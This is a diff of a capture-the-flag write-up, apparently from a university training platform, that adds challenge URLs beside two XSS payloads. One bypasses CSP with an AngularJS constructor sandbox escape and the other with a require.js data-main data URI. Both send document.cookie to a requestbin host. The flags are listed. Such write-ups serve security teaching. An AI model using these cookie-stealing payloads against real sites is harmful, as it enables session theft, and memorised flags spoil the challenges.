@@ -6,6 +6,7 @@
 
 **flag=flag{4re_yo0_s0_sure_csp_1s_useful?}**
 # csp
+> http://csp.training.ctf.necst.it/
 ```javascript
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script> <div ng-app ng-csp id=p ng-click={{constructor.constructor("window.location.href='https://requestbin.training.ctf.necst.it/1a2ro011?cookie='+document.cookie")()}}>
 ```
@@ -13,6 +14,7 @@
 **flag=flag{th1s1s_how_w3_byp4ss3d_csp}**
 
 # strict csp
+> http://strict-csp.training.ctf.necst.it/
 ```javascript
 <script data-main="data:1,window.location.href='https://requestbin.training.ctf.necst.it/x57dvjx5?cookie='+document.cookie" src='require.js'></script>
 ```
